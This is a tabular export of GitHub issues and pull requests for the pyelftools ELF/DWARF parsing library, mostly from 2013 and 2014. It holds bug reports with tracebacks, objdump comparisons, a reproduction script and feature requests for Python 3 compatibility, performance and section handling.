eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/41,35030514,MDU6SXNzdWUzNTAzMDUxNA==,41,examples/dwarf_location_lists.py and examples/dwarf_range_lists.py fail with Jython,656294,open,FALSE,NA,NA,2,2014-06-05T06:25:54Z,2016-10-16T21:15:20Z,NA,NONE,NA,"`examples/dwarf_location_lists.py` and `examples/dwarf_range_lists.py` fail with Jython.
Other `examples/*.py` tests pass with Jython.
All `examples/*.py` tests pass with CPython.

```
$ jython2.7 test/run_examples_test.py
Example './examples/dwarf_decode_address.py'
Example './examples/dwarf_location_lists.py'
.......FAIL comparison
@@ Output #1 dumped to file: /tmp/out1_bbpziI.stdout
Example './examples/examine_dwarf_info.py'
Example './examples/elfclass_address_size.py'
Example './examples/elf_show_debug_sections.py'
Example './examples/elf_low_high_api.py'
Example './examples/dwarf_range_lists.py'
.......FAIL comparison
@@ Output #1 dumped to file: /tmp/out1_WfqAXl.stdout
Example './examples/elf_relocations.py'
Example './examples/dwarf_die_tree.py'

Conclusion: FAIL
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/41/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/41/comments,https://api.github.com/repos/eliben/pyelftools/issues/41/events,https://github.com/eliben/pyelftools/issues/41,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/40,35008298,MDExOlB1bGxSZXF1ZXN0MTY3MzcyMzg=,40,fix parsing of dynamic ELFs w/out section headers,176950,closed,FALSE,NA,NA,1,2014-06-04T21:57:19Z,2014-06-14T13:06:20Z,2014-06-14T13:06:20Z,CONTRIBUTOR,NA,"finally got around to refreshing this patch & adding a test case as originally requested

this should fix issue 3 and issue 29
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/40/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/40/comments,https://api.github.com/repos/eliben/pyelftools/issues/40/events,https://github.com/eliben/pyelftools/pull/40,https://api.github.com/repos/eliben/pyelftools/pulls/40
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/39,34963965,MDExOlB1bGxSZXF1ZXN0MTY3MTE0Nzc=,39,"Add ldd.py, a clone of ldd",297301,closed,FALSE,NA,NA,5,2014-06-04T14:30:38Z,2014-11-01T13:16:11Z,2014-11-01T13:16:11Z,NONE,NA,"This is useful on systems built with musl (see http://www.musl-libc.org/) which lack an ldd.  I am currently working on tests.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/39/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/39/comments,https://api.github.com/repos/eliben/pyelftools/issues/39/events,https://github.com/eliben/pyelftools/pull/39,https://api.github.com/repos/eliben/pyelftools/pulls/39
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/38,32616040,MDExOlB1bGxSZXF1ZXN0MTUzODgxNTM=,38,Pull out StringTable class into new elftools.elf.strings module,1024659,closed,FALSE,NA,NA,4,2014-05-01T13:54:50Z,2014-07-03T11:15:49Z,2014-06-04T23:03:34Z,NONE,NA,"This will help passing the string table to the DynamicTag constructor without depending on section headers being present.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/38/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/38/comments,https://api.github.com/repos/eliben/pyelftools/issues/38/events,https://github.com/eliben/pyelftools/pull/38,https://api.github.com/repos/eliben/pyelftools/pulls/38
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/37,32614554,MDExOlB1bGxSZXF1ZXN0MTUzODczMjE=,37,Add ELFFile.map() method to get file offset from memory address,1024659,closed,FALSE,NA,NA,4,2014-05-01T13:27:50Z,2014-07-25T22:01:14Z,2014-06-03T17:14:27Z,NONE,NA,"There are a few implementations of this floating around (e.g. _string_table() method in Issue #3). My version includes a size parameter so that we can check if a whole region is mapped, rather than just a single byte. It also raises an error for multiple inconsistent mappings. Let me know if you’d rather go for a simpler version of this function without these features.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/37/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/37/comments,https://api.github.com/repos/eliben/pyelftools/issues/37/events,https://github.com/eliben/pyelftools/pull/37,https://api.github.com/repos/eliben/pyelftools/pulls/37
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/36,32611527,MDExOlB1bGxSZXF1ZXN0MTUzODU2MzY=,36,Drop unused imports,1024659,closed,FALSE,NA,NA,0,2014-05-01T12:13:48Z,2014-07-03T11:19:19Z,2014-05-03T03:04:21Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/36/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/36/comments,https://api.github.com/repos/eliben/pyelftools/issues/36/events,https://github.com/eliben/pyelftools/pull/36,https://api.github.com/repos/eliben/pyelftools/pulls/36
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/35,32611499,MDExOlB1bGxSZXF1ZXN0MTUzODU2Mjk=,35,Avoid BytesWarning in debugging messages in Python 3,1024659,closed,FALSE,NA,NA,0,2014-05-01T12:13:21Z,2014-08-11T22:32:03Z,2014-05-03T03:37:27Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/35/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/35/comments,https://api.github.com/repos/eliben/pyelftools/issues/35/events,https://github.com/eliben/pyelftools/pull/35,https://api.github.com/repos/eliben/pyelftools/pulls/35
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/34,32611447,MDExOlB1bGxSZXF1ZXN0MTUzODU2MjE=,34,Implement Section.__hash__() to avoid Python 2’s DeprecationWarning,1024659,closed,FALSE,NA,NA,1,2014-05-01T12:12:44Z,2014-05-31T03:09:55Z,2014-05-03T03:39:24Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/34/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/34/comments,https://api.github.com/repos/eliben/pyelftools/issues/34/events,https://github.com/eliben/pyelftools/pull/34,https://api.github.com/repos/eliben/pyelftools/pulls/34
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/33,32611363,MDExOlB1bGxSZXF1ZXN0MTUzODU2MDg=,33,Use integer division in Python 3,1024659,closed,FALSE,NA,NA,0,2014-05-01T12:11:47Z,2014-07-03T11:23:43Z,2014-05-03T03:03:49Z,NONE,NA,"This means DwarfConfig.default_address_size is now an integer in Python 3, as
in Python 2.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/33/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/33/comments,https://api.github.com/repos/eliben/pyelftools/issues/33/events,https://github.com/eliben/pyelftools/pull/33,https://api.github.com/repos/eliben/pyelftools/pulls/33
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/32,32611310,MDExOlB1bGxSZXF1ZXN0MTUzODU1OTg=,32,"Use tuples with str.endswith(), supported since Python 2.5",1024659,closed,FALSE,NA,NA,0,2014-05-01T12:11:17Z,2014-07-03T11:21:00Z,2014-05-03T02:57:50Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/32/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/32/comments,https://api.github.com/repos/eliben/pyelftools/issues/32/events,https://github.com/eliben/pyelftools/pull/32,https://api.github.com/repos/eliben/pyelftools/pulls/32
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/31,32611237,MDExOlB1bGxSZXF1ZXN0MTUzODU1ODY=,31,BaseException.message is deprecated in Python 2.6 and gone in 3,1024659,closed,FALSE,NA,NA,0,2014-05-01T12:10:33Z,2014-07-25T22:01:14Z,2014-06-03T17:26:13Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/31/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/31/comments,https://api.github.com/repos/eliben/pyelftools/issues/31/events,https://github.com/eliben/pyelftools/pull/31,https://api.github.com/repos/eliben/pyelftools/pulls/31
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/30,31961904,MDExOlB1bGxSZXF1ZXN0MTUwMDYyMjM=,30,Cleanups and Python 3 fixes,1024659,closed,FALSE,NA,NA,3,2014-04-22T10:39:45Z,2014-04-25T05:36:11Z,2014-04-23T23:13:55Z,NONE,NA,"Here are some minor fixes I’ve been keeping to myself for too long :)
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/30/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/30/comments,https://api.github.com/repos/eliben/pyelftools/issues/30/events,https://github.com/eliben/pyelftools/pull/30,https://api.github.com/repos/eliben/pyelftools/pulls/30
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/29,31955599,MDU6SXNzdWUzMTk1NTU5OQ==,29,A minor issue related to 0 section headers,4557912,closed,FALSE,NA,NA,3,2014-04-22T08:55:02Z,2014-08-21T21:35:04Z,2014-04-23T23:46:43Z,NONE,NA,"Hi, Dear Eliben
First thanks a lot to your excellent tool, I had been using it since 2012. -- It helps a lot on my reverse engineering works.
Here is the issue I met:
When analyzing an elf file with 0 section headers contained, pyelftool reports an error of ""UnboundLocalError: local variable 'stringtable' referenced before assignment"".

Tracking back in call stack I found in dynamic.py, stringtable is NOT initialized in **init** function for the sake of ""Zero""  section.
As the segment is a Dynamic one, elftool tries to look up a corresponding ""dynamic"" section for more relevant data. -- but it fails anyway.

Secion information may be removed from most of proprietary elf files delivered to out-side world. Would you kindly consider to add some lines as a tolerance to this case?
e.g. a section amount check and a dummy assignment to stringtable before iterating section in **init** function.
    def **init**(self, header, stream, elffile):
            if elffile.num_sections() == 0:
            stringtable = ""dummy""

Thanks a lot.
And best regards to your work :)

Billy
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/29/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/29/comments,https://api.github.com/repos/eliben/pyelftools/issues/29/events,https://github.com/eliben/pyelftools/issues/29,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/28,29784265,MDU6SXNzdWUyOTc4NDI2NQ==,28,Dwarf 4 support,3856546,closed,FALSE,NA,NA,6,2014-03-20T00:08:56Z,2014-03-23T01:50:08Z,2014-03-22T21:50:52Z,NONE,NA,"Pyelftools does not support dwarf 4 and fails parsing when it encounters some of the new types (e.g. DW_FORM_exprloc). Even if full support is not provided, pyelftool should be able to skip the abbrev table it does not understand.

Many Linux distributions are starting to use DWARF4 with their toolchains now.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/28/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/28/comments,https://api.github.com/repos/eliben/pyelftools/issues/28/events,https://github.com/eliben/pyelftools/issues/28,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/27,28379436,MDU6SXNzdWUyODM3OTQzNg==,27,Disagreement between objdump and pyelftools on DW_TAG_typedef::DW_AT_type,543719,open,FALSE,NA,NA,12,2014-02-26T23:15:04Z,2016-11-21T19:25:41Z,NA,NONE,NA,"I am trying to use pyelftools to parse both TriCore and C166 ELF files (just TriCore for now) to get a list of variables and addresses including being aware of structure members.  The application will be for a remote watch window for the embedded target.  I have [fiddled with the dwarf_die_tree.py example](http://tny.cz/c7174417) but ran into an issue where I am unable to connect between typedef’s and the unnamed structure definitions they reference.  Or so it seems to my DWARF-ignorant brain (in case my previous comments did not in some way make that obvious).

To avoid any issues associated with my particular architecture ELF I also tried my script against test/testfiles_for_unittests/sample_exe64.elf and observed the same thing.  When I run objdump -W as a reference I get, amongst other things:

```
<1><1d6>: Abbrev Number: 3 (DW_TAG_typedef)
    <1d7>   DW_AT_name        : (indirect string, offset: 0xcd): size_t
    <1db>   DW_AT_decl_file   : 2
    <1dc>   DW_AT_decl_line   : 214
    <1dd>   DW_AT_type        : <0x1e1>
```

My pyelftools script results in (again, just a snippet):

```
  DIE tag=DW_TAG_typedef
    Name: size_t
    Offset: 470
    File: 2
    Line: 214
    Type: 63
    Attributes: OrderedDict([('DW_AT_name', AttributeValue(name='DW_AT_name', form='DW_FORM_strp', value=b'size_t', raw_value=205, offset=471)), ('DW_AT_decl_file', AttributeValue(name='DW_AT_decl_file', form='DW_FORM_data1', value=2, raw_value=2, offset=475)), ('DW_AT_decl_line', AttributeValue(name='DW_AT_decl_line', form='DW_FORM_data1', value=214, raw_value=214, offset=476)), ('DW_AT_type', AttributeValue(name='DW_AT_type', form='DW_FORM_ref4', value=63, raw_value=63, offset=477))])
    DIE: ['__class__', '__delattr__', '__dict__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_children', '_parent', '_parse_DIE', '_translate_attr_value', 'abbrev_code', 'add_child', 'attributes', 'cu', 'dwarfinfo', 'get_full_path', 'get_parent', 'has_children', 'is_null', 'iter_children', 'iter_siblings', 'offset', 'set_parent', 'size', 'stream', 'tag']
```

What seems to me to be an issue is that objdump shows DW_AT_type as 0x1e1 (481) as opposed to pyelftools which returns 63 (0x3f).  The other values I have compared seem to correspond.  Is this a simple lack of understanding of DWARF or a misuse of pyelftools, or is there an issue here?  I started to dig in the code a bit but with my limited knowledge I didn’t find anything that looking glaringly wrong.

Here’s my system info (Python3 within Cygwin64 within Win7 64):

```
CYGWIN_NT-6.1 GUS-CZJCBS1 1.7.28(0.271/5/3) 2014-02-09 21:06 x86_64 Cygwin

Python 3.2.5 (default, Oct  2 2013, 22:58:11)
[GCC 4.8.1] on cygwin

Installed pyelftools from Git rev c9594acd0e1a1b87ab9a8b1de2b22c1411d617ff
```

Thank you for any time you choose to spend helping me.
-kyle
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/27/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/27/comments,https://api.github.com/repos/eliben/pyelftools/issues/27/events,https://github.com/eliben/pyelftools/issues/27,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/26,28049952,MDU6SXNzdWUyODA0OTk1Mg==,26,memory consumption and performance problems,79528,closed,FALSE,NA,NA,7,2014-02-21T15:39:06Z,2016-10-16T21:02:01Z,2016-10-16T21:02:01Z,CONTRIBUTOR,NA,"Hi,

The following code never finishes (I killed it after 30 minutes) and consumes more  than 3 GiB (and growing amount) of RAM.

```
$ cat fff.py
from __future__ import print_function

import libarchive
import sys
import os
import resource
from six.moves import cStringIO

try:
    from elftools.elf.elffile import ELFFile
except ImportError as exc:
    print(str(exc), file=sys.stderr)
    sys.exit(-1)


def get_producer(debugfile):
    elffile = ELFFile(debugfile)
    dwarfinfo = elffile.get_dwarf_info()

    producers = set()

    for CU in dwarfinfo.iter_CUs():
        # Start with the top DIE, the root for this CU's DIE tree
        top_DIE = CU.get_top_DIE()
        try:
            attrs = top_DIE.attributes['DW_AT_producer']
            if attrs.form == 'DW_FORM_GNU_strp_alt':
                print(""XXX"")
            elif attrs.form == 'DW_FORM_strp':  # lucky ;)
                print(""XXX"")
            else:
                print(attrs.form)
        except:
            pass

    return producers


def process_file(debugfile):
    elffile = ELFFile(debugfile)

    if not elffile.has_dwarf_info():
        assert 0
    else:
        return get_producer(debugfile)

pid = os.getpid()

a = libarchive.Archive(sys.argv[1])

for entry in a:
    print(entry.pathname)
    memusage = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    sys.stderr.write(""%s -> %s -> %s -> %s\n""
                     % (pid, sys.argv[1], entry.pathname, memusage))

    try:
        data = a.read(entry.size)
        memusage = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        sys.stderr.write(""[AR] %s -> %s -> %s -> %s\n""
                         % (pid, sys.argv[1], entry.pathname, memusage))

        fh = cStringIO(data)
        sys.stderr.write(""[ARP] %s -> %s -> %s -> %s\n""
                         % (pid, sys.argv[1], entry.pathname, memusage))

        process_file(fh)
    except:
        pass

a.close()

$  python fff.py seamonkey-debuginfo-2.24-1.fc21.x86_64.rpm  # sit back ;(

```

You can download the problematic RPM from [this URL](http://dl.fedoraproject.org/pub/fedora/linux/development/rawhide/x86_64/debug/s/).

python-libarchive is responsible for consuming 600 MiB (which is OK).
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/26/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/26/comments,https://api.github.com/repos/eliben/pyelftools/issues/26/events,https://github.com/eliben/pyelftools/issues/26,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/25,27471868,MDU6SXNzdWUyNzQ3MTg2OA==,25,Problems rewinding to the beginning of a DebugSectionDescriptor stream,108767,open,FALSE,NA,NA,2,2014-02-12T21:28:14Z,2016-10-16T21:15:40Z,NA,NONE,NA,"The DWARF parsing code will occasionally try to rewind to the start of a DebugSectionDescriptor stream via `stream.seek(0, os.SEEK_SET)` but this does not work if the section is located somewhere else in the stream. This forces the user to implement their own file-like sub-stream, or copy the file into memory.

Maybe it should use the `global_offset` property that the user provides to the constructor?
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/25/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/25/comments,https://api.github.com/repos/eliben/pyelftools/issues/25/events,https://github.com/eliben/pyelftools/issues/25,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/24,26176364,MDExOlB1bGxSZXF1ZXN0MTE4MDY3Mzc=,24,Handle absence of .debug_ranges gracefully,74875,closed,FALSE,NA,NA,2,2014-01-23T16:00:31Z,2014-07-03T11:21:41Z,2014-01-25T14:41:31Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/24/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/24/comments,https://api.github.com/repos/eliben/pyelftools/issues/24/events,https://github.com/eliben/pyelftools/pull/24,https://api.github.com/repos/eliben/pyelftools/pulls/24
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/23,25876245,MDU6SXNzdWUyNTg3NjI0NQ==,23,readelf.py --debug-dump=decodedline fails,74875,open,FALSE,NA,NA,4,2014-01-19T07:04:53Z,2017-02-04T17:11:57Z,NA,CONTRIBUTOR,NA,"Running `python scripts/readelf.py --debug-dump=decodedline test/testfiles_for_unittests/arm_with_form_indirect.elf` fails with the following error:

```
Traceback (most recent call last):
  File ""scripts/readelf.py"", line 1136, in <module>
    main()
  File ""scripts/readelf.py"", line 1115, in main
    readelf.display_debug_dump(options.debug_dump_what)
  File ""scripts/readelf.py"", line 635, in display_debug_dump
    self._dump_debug_line_programs()
  File ""scripts/readelf.py"", line 872, in _dump_debug_line_programs
    cu_filename = bytes2str(lineprogram['file_entry'][0].name)
TypeError: 'NoneType' object is not subscriptable
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/23/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/23/comments,https://api.github.com/repos/eliben/pyelftools/issues/23/events,https://github.com/eliben/pyelftools/issues/23,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/22,25634701,MDU6SXNzdWUyNTYzNDcwMQ==,22,Error trying to obtain dwarf info: 'structs' is not defined ,3647302,closed,FALSE,NA,NA,8,2014-01-15T09:24:38Z,2014-01-21T16:39:06Z,2014-01-18T14:36:12Z,NONE,NA,"Hello,
I'm trying to run the example examine_dwarf_info in an ELF file from Microvision but I receive the following error, could you please tell me if I'm doing something wrong or if there is a way to fix it? The example runs properly with the elf file provided as example. I'm using Python 2.7.3. Thank you.

```
Processing file: uvision/O0/obj/UserManualExample.axf
  Found a compile unit at offset 0, length 15044
Traceback (most recent call last):
  File ""examine_dwarf_info.py"", line 50, in <module>
    process_file(filename)
  File ""examine_dwarf_info.py"", line 42, in process_file
    top_DIE = CU.get_top_DIE()
  File ""/usr/lib/python2.7/site-packages/elftools/dwarf/compileunit.py"", line 76, in get_top_DIE
    return self._get_DIE(0)
  File ""/usr/lib/python2.7/site-packages/elftools/dwarf/compileunit.py"", line 95, in _get_DIE
    self._parse_DIEs()
  File ""/usr/lib/python2.7/site-packages/elftools/dwarf/compileunit.py"", line 119, in _parse_DIEs
    offset=die_offset)
  File ""/usr/lib/python2.7/site-packages/elftools/dwarf/die.py"", line 90, in __init__
    self._parse_DIE()
  File ""/usr/lib/python2.7/site-packages/elftools/dwarf/die.py"", line 185, in _parse_DIE
    value = self._translate_attr_value(form, raw_value)
  File ""/usr/lib/python2.7/site-packages/elftools/dwarf/die.py"", line 207, in _translate_attr_value
    structs.Dwarf_dw_form[form], self.stream)
NameError: global name 'structs' is not defined
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/22/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/22/comments,https://api.github.com/repos/eliben/pyelftools/issues/22/events,https://github.com/eliben/pyelftools/issues/22,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/21,25047586,MDU6SXNzdWUyNTA0NzU4Ng==,21,latest pyelftools fails on Linux with cannot import name SUNWSyminfoTableSection when installed,1053889,closed,FALSE,NA,NA,1,2014-01-04T03:34:24Z,2014-01-05T23:00:38Z,2014-01-05T23:00:38Z,NONE,NA,"it seems to work when running the examples inside the source dir. Some missing file in setup.py? 

I reverted the solaris changed for now in my copy
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/21/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/21/comments,https://api.github.com/repos/eliben/pyelftools/issues/21/events,https://github.com/eliben/pyelftools/issues/21,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/20,24987519,MDU6SXNzdWUyNDk4NzUxOQ==,20,elffile.get_dwarf_info() Failed,1322359,closed,FALSE,NA,NA,4,2014-01-02T21:12:28Z,2014-01-06T00:31:11Z,2014-01-05T23:55:19Z,NONE,NA,"I was trying to parse a linux kernel object which has debug information. The function elffile.get_dwarf_info() failed. I've test with some other linux kernel object, all failed with the same error.

> python dwarf_die_tree.py ~/new-kernel/linux-3.12.1/vmlinux-3.12.1 
> Processing file: /home/cs3612/new-kernel/linux-3.12.1/vmlinux-3.12.1
> Traceback (most recent call last):
>   File ""dwarf_die_tree.py"", line 65, in <module>
>     process_file(filename)
>   File ""dwarf_die_tree.py"", line 31, in process_file
>     dwarfinfo = elffile.get_dwarf_info()
>   File ""../elftools/elf/elffile.py"", line 140, in get_dwarf_info
>     relocate_dwarf_sections)
>   File ""../elftools/elf/elffile.py"", line 357, in _read_dwarf_section
>     section_stream, reloc_section)
>   File ""../elftools/elf/relocation.py"", line 124, in apply_section_relocations
>     self._do_apply_relocation(stream, reloc, symtab)
>   File ""../elftools/elf/relocation.py"", line 181, in _do_apply_relocation
>     value_struct.build_stream(relocated_value, stream)
>   File ""../elftools/construct/core.py"", line 211, in build_stream
>     self._build(obj, stream, Container())
>   File ""../elftools/construct/core.py"", line 358, in _build
>     raise FieldError(ex)
> elftools.construct.core.FieldError: integer out of range for 'L' format code
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/20/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/20/comments,https://api.github.com/repos/eliben/pyelftools/issues/20/events,https://github.com/eliben/pyelftools/issues/20,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/19,24918136,MDExOlB1bGxSZXF1ZXN0MTExNTgxMDc=,19,Performance and memory improvements,465451,closed,FALSE,NA,NA,4,2013-12-31T11:32:57Z,2016-10-16T20:48:50Z,2016-10-16T20:48:50Z,NONE,NA,"This request includes performance improvement and memory footprint reducing.  I am using pyelftools in my project to parse and analysis runtime information of Gecko.  It is end up to consume a lot of memory and hit some performance problem.   This request includes following changes
- Parse DIEs increamentally
- A cache for CUs
- Optional to use ShiftedIO instead of BytesIO to avoid reading data into the memory until necessary.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/19/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/19/comments,https://api.github.com/repos/eliben/pyelftools/issues/19/events,https://github.com/eliben/pyelftools/pull/19,https://api.github.com/repos/eliben/pyelftools/pulls/19
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/18,24844849,MDExOlB1bGxSZXF1ZXN0MTExMjQ2MTg=,18,Use correct Python2/3 compatibility iterator.,4881193,closed,FALSE,NA,NA,0,2013-12-28T11:49:11Z,2013-12-28T18:01:58Z,2013-12-28T16:38:53Z,CONTRIBUTOR,NA,"All Unit Tests run OK with python2 and python3.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/18/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/18/comments,https://api.github.com/repos/eliben/pyelftools/issues/18/events,https://github.com/eliben/pyelftools/pull/18,https://api.github.com/repos/eliben/pyelftools/pulls/18
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/17,24827742,MDExOlB1bGxSZXF1ZXN0MTExMTY0MDI=,17,    Use correct Python2/3 compatibility iterator.,4881193,closed,FALSE,NA,NA,2,2013-12-27T17:48:46Z,2014-06-25T23:45:36Z,2013-12-28T11:47:01Z,CONTRIBUTOR,NA,"Use an iterator which provides for Python2 and Python3 compatibility. All the unit tests pass, but I have not extended them to test this functionality. If required, a test like the following exercises the change:

$ git diff examples/dwarf_die_tree.py
diff --git a/examples/dwarf_die_tree.py b/examples/dwarf_die_tree.py
index 9dcb6b6..98851f4 100644
--- a/examples/dwarf_die_tree.py
+++ b/examples/dwarf_die_tree.py
@@ -62,7 +62,7 @@ def die_info_rec(die, indent_level='    '):
     """""" A recursive function for showing information about a DIE and its
         children.
     """"""
-    print(indent_level + 'DIE tag=%s' % die.tag)
-    print(indent_level + 'DIE=%s' % die)
   child_indent = indent_level + '  '
   for child in die.iter_children():
       die_info_rec(child, child_indent)
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/17/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/17/comments,https://api.github.com/repos/eliben/pyelftools/issues/17/events,https://github.com/eliben/pyelftools/pull/17,https://api.github.com/repos/eliben/pyelftools/pulls/17
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/16,24818383,MDExOlB1bGxSZXF1ZXN0MTExMTE4MzY=,16,Centralise the logic for getting the filename for a DIE.,4881193,closed,FALSE,NA,NA,0,2013-12-27T12:39:54Z,2014-06-15T22:04:23Z,2013-12-27T14:18:06Z,CONTRIBUTOR,NA,"1. Centralise the logic for getting the filename for a DIE.
2. Use the form of logic suggested by Philippe Ombredanne (thanks!).
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/16/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/16/comments,https://api.github.com/repos/eliben/pyelftools/issues/16/events,https://github.com/eliben/pyelftools/pull/16,https://api.github.com/repos/eliben/pyelftools/pulls/16
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/15,24475691,MDU6SXNzdWUyNDQ3NTY5MQ==,15,add support for modifying and writing back to file,10137,closed,FALSE,NA,NA,3,2013-12-18T08:28:08Z,2019-02-23T18:40:52Z,2013-12-27T16:16:17Z,NONE,NA,"It would be great to be able to modify certain segments and sections and be able to write dump out the same to a file.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/15/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/15/comments,https://api.github.com/repos/eliben/pyelftools/issues/15/events,https://github.com/eliben/pyelftools/issues/15,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/14,22596627,MDU6SXNzdWUyMjU5NjYyNw==,14,The construct module is out of date!!! Problem will raise under the envirmonent python3.3,5616667,closed,FALSE,NA,NA,2,2013-11-13T15:03:25Z,2013-12-27T16:16:54Z,2013-12-27T16:16:54Z,NONE,NA,"I try to write back some data into elf file  use the pyelftools like that:
from elftools.elf.elffile import ELFFile
from elftools.elf.strucs import ELFStructs
elf=ELFFile(open('an elf file','rb'))
struct=ELFStructs()
struct.Elf_Ehdr.build(elf.header)
my python is in version 3.3 and it return a TypeError 
and then I replace the construct module with the latest construct module and it going fun.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/14/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/14/comments,https://api.github.com/repos/eliben/pyelftools/issues/14/events,https://github.com/eliben/pyelftools/issues/14,NA
